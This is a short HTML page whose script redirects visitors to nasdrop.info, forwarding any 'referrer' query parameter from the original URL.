<html>
<script>
	var urlParams = new URLSearchParams(window.location.search);
  	var referrer;
  	if(urlParams.has('referrer')){
    	referrer = urlParams.get('referrer');
    	window.location.href = 'http://nasdrop.info/index.html?referrer=' + referrer;
  	} else {
		window.location.href = 'http://nasdrop.info/index.html';
  	}
	
</script>
</html>
